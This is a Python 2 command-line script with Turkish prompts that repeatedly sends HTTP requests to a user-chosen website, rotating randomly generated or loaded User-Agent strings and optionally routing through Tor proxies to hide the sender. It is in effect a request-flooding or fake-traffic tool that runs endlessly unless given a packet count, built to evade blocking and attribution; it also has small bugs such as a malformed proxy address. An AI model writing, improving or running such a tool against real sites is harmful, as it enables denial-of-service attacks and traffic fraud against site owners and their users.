#!/usr/bin/python2
#-*- coding:utf-8 -*-
print("""
 __   _  _____  ____   __    _      __    _   __   _  
( (` | |  | |  | |_   / /\  \ \  / / /`  | | ( (` | | 
_)_) |_|  |_|  |_|__ /_/--\  \_\/  \_\_, |_| _)_) |_| 

""")
class renkler:
    ResetAll = "\033[0m"

    Bold       = "\033[1m"
    Dim        = "\033[2m"
    Underlined = "\033[4m"
    Blink      = "\033[5m"
    Reverse    = "\033[7m"
    Hidden     = "\033[8m"

    ResetBold       = "\033[21m"
    ResetDim        = "\033[22m"
    ResetUnderlined = "\033[24m"
    ResetBlink      = "\033[25m"
    ResetReverse    = "\033[27m"
    ResetHidden     = "\033[28m"

    Default      = "\033[39m"
    Black        = "\033[30m"
    Red          = "\033[31m"
    Green        = "\033[32m"
    Yellow       = "\033[33m"
    Blue         = "\033[34m"
    Magenta      = "\033[35m"
    Cyan         = "\033[36m"
    LightGray    = "\033[37m"
    DarkGray     = "\033[90m"
    LightRed     = "\033[91m"
    LightGreen   = "\033[92m"
    LightYellow  = "\033[93m"
    LightBlue    = "\033[94m"
    LightMagenta = "\033[95m"
    LightCyan    = "\033[96m"
    White        = "\033[97m"

    BackgroundDefault      = "\033[49m"
    BackgroundBlack        = "\033[40m"
    BackgroundRed          = "\033[41m"
    BackgroundGreen        = "\033[42m"
    BackgroundYellow       = "\033[43m"
    BackgroundBlue         = "\033[44m"
    BackgroundMagenta      = "\033[45m"
    BackgroundCyan         = "\033[46m"
    BackgroundLightGray    = "\033[47m"
    BackgroundDarkGray     = "\033[100m"
    BackgroundLightRed     = "\033[101m"
    BackgroundLightGreen   = "\033[102m"
    BackgroundLightYellow  = "\033[103m"
    BackgroundLightBlue    = "\033[104m"
    BackgroundLightMagenta = "\033[105m"
    BackgroundLightCyan    = "\033[106m"
    BackgroundWhite        = "\033[107m"
    #https://godoc.org/github.com/whitedevops/colors
try:
    import hashlib
    import os
    import urllib2
    import requests
    import socks
    import socket
    import random
    from fake_useragent import UserAgent
    import argparse
except ImportError as bul:
    print(renkler.Red+str(bul)+renkler.ResetAll)
    exit()
ka = []
kao_ = UserAgent()
tor = False
parser = argparse.ArgumentParser()
parser.add_argument('--site','-s',help='Hedef site adresi')
parser.add_argument('--kao','-k',help='Kullanıcı aracısı(User-Agent) ekle (-k liste.txt)')
parser.add_argument('--kaos','-K',help='Kullanıcı aracısı(User-Agent) oluşturur(-K ADET)',type=int)
parser.add_argument('--paket',help='Gönderilicek paket sayısı(Seçilmez ise sürekli devam eder)',type=int)
parser.add_argument('--torsocks5','-t5',help='Tor proxy(SOCKS5) aktif edilir',action='store_true')
parser.add_argument('--torsocks4','-t4',help='Tor proxy(SOCKS4) aktif edilir',action='store_true')
parser.add_argument('--torhttp','-th',help='Tor proxy(HTTP) aktif edilir',action='store_true')
args = parser.parse_args()
if(args.kao):
    print(renkler.LightMagenta+ "Liste alınıyor..."+renkler.ResetAll)
    try:
        dosya = open(args.kao,"r")
        say = 0
        
        for x in dosya.readlines():
            say += 1
            ka.append(x)
        print(renkler.BackgroundBlue+renkler.White+"Tamamlandı. %d adet eklendi"+renkler.ResetAll)%(say)
        say = 0
    except KeyboardInterrupt:
        pass
    except IOError:
        print(renkler.Red+"Dosya bulunamadı."+renkler.ResetAll)
        exit()

if(args.kaos):
    print(renkler.Cyan+"%d "+renkler.LightMagenta+ "adet oluşturuluyor..."+renkler.ResetAll)%(args.kaos)
    for x in range(args.kaos):
        f = kao_.random
        ka.append(f)
    print(renkler.BackgroundBlue+renkler.White+"Tamamlandı."+renkler.ResetAll)
    soru =raw_input(renkler.Dim+"Kayıt edilsin mi E/H:")
    soru = soru.lower()
    if(soru=="e"):
        soru = raw_input(renkler.Green+"Kayıt edilicek dosya adı:"+renkler.BackgroundBlue)
        dosya =  open(soru,"w")
        print(renkler.ResetAll+renkler.LightCyan+"Kayıt ediliyor..."+renkler.ResetAll)
        for x in ka:
            deger = x,os.linesep
            dosya.writelines(deger)
        print(renkler.BackgroundBlue+renkler.White+"Tamamlandı."+renkler.ResetAll)
if(args.torhttp):
    try:
        print(renkler.Magenta+"Tor ağına bağlanıyor..."+renkler.ResetAll)
        socks.set_default_proxy(socks.PROXY_TYPE_HTTP,'127.0.01',9080,True)
        socket.socket = socks.socksocket
        print(renkler.LightGreen+"Tor proxy:"+renkler.BackgroundBlue+renkler.White+requests.get('https://api.ipify.org?format=json%27').text + renkler.ResetAll)
    except socks.ProxyConnectionError:
        print(renkler.Red+"Tor ağına bağlanamadı."+renkler.ResetAll)
        print(renkler.LightRed+"Tor servisin aktif olduğundan emin olun."+renkler.ResetAll)
        print(renkler.LightRed+"Tor servisin HTTP TÜNELİ(9080) port üzerinden aktif olduğundan emin olun."+renkler.ResetAll)
        exit()
    except KeyboardInterrupt:
        pass
if(args.torsocks5):
    try:
        print(renkler.Magenta+"Tor ağına bağlanıyor..."+renkler.ResetAll)
        socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5,'127.0.01',9050,True)
        socket.socket = socks.socksocket
        print(renkler.LightGreen+"Tor proxy:"+renkler.BackgroundBlue+renkler.White+requests.get('https://api.ipify.org?format=json%27').text + renkler.ResetAll)
    except socks.ProxyConnectionError:
        print(renkler.Red+"Tor ağına bağlanamadı."+renkler.ResetAll)
        print(renkler.LightRed+"Tor servisin aktif olduğundan emin olun."+renkler.ResetAll)
        print(renkler.LightRed+"Tor servisin SOCKS5 TÜNELİ(9050) port üzerinden aktif olduğundan emin olun."+renkler.ResetAll)
        exit()
    except KeyboardInterrupt:
        pass
if(args.torsocks4):
    try:
        print(renkler.Magenta+"Tor ağına bağlanıyor..."+renkler.ResetAll)
        socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5,'127.0.01',9050,True)
        socket.socket = socks.socksocket
        print(renkler.LightGreen+"Tor proxy:"+renkler.BackgroundBlue+renkler.White+requests.get('https://api.ipify.org?format=json%27').text + renkler.ResetAll)
    except socks.ProxyConnectionError:
        print(renkler.Red+"Tor ağına bağlanamadı."+renkler.ResetAll)
        print(renkler.LightRed+"Tor servisin aktif olduğundan emin olun."+renkler.ResetAll)
        print(renkler.LightRed+"Tor servisin SOCKS4 TÜNELİ(9050) port üzerinden aktif olduğundan emin olun."+renkler.ResetAll)
        exit()
    except KeyboardInterrupt:
        pass

try:
  if(args.site):
        if('https://' in args.site):
            pass
        elif('http://' in args.site):
            pass
        else:
            print(renkler.BackgroundRed+renkler.White+"Sitenin başına http veya https ekleyin.")
            exit()
        request = urllib2.Request(args.site)
        y = random.choice(ka)
        request.add_header('Cache-Control', 'no-cache')
        request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
        request.add_header('User-Agent', y)
        request.add_header('Connection', 'keep-alive')
        say = 0
        while True:
         try:
             y = random.choice(ka)
             request.add_header('User-Agent', y)
             if(args.paket):
                if(say == args.paket):
                    print(renkler.BackgroundGreen+renkler.White+"Tammalandı."+renkler.ResetAll)
                    exit()
             urllib2.urlopen(request)
             say+=1
             print(renkler.BackgroundGreen+renkler.White+"%d. Trafik oluşturuldu."+renkler.ResetAll)%(say)
         except urllib2.HTTPError as e:
                print(renkler.Red +str(e)+renkler.ResetAll)
except KeyboardInterrupt:
    pass
